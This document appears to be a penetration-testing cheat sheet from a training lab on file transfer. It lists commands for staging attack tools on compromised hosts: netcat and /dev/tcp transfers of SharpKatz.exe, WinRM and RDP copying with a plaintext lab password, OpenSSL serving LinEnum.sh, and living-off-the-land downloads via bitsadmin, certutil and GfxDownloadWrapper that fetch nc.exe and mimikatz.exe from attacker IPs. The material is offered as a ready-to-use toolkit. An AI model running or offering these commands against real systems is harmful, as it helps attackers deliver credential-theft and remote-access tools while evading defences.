### Netcat File Transfer

```bash
## Attack host sending
nc -q 0 192.168.49.128 8000 < SharpKatz.exe

## Compromised machine listening
nc -l -p 8000 > SharpKatz.exe

## Alternative - /dev/tcp to receive
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### PowerShell Session File Transfer

TCP/5985 for HTTP
\
TCP/5986 for HTTPS.
```powershell
## Confirm WinRM port open
Test-NetConnection -ComputerName DATABASE01 -Port 5985

## Create remoting session
$Session = New-PSSession -ComputerName DATABASE01

## Copy localhost to remote
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

## Copy remote to localhost
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP 

```bash
## Mounting linux folder (rdesktop)
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

## Mounting linux folder (xfreerdp)
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

## LOLBAS/GTFOBINS

### OpenSSL File Transfer

```bash
## Create certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

## Stand up server
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

## Download from compromised host
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

### Bitsadmin File Transfer

```powershell
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe

Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### CertUtil File Transfer

```powershell
## Download 
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

### GfxDownloadWrapper

```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```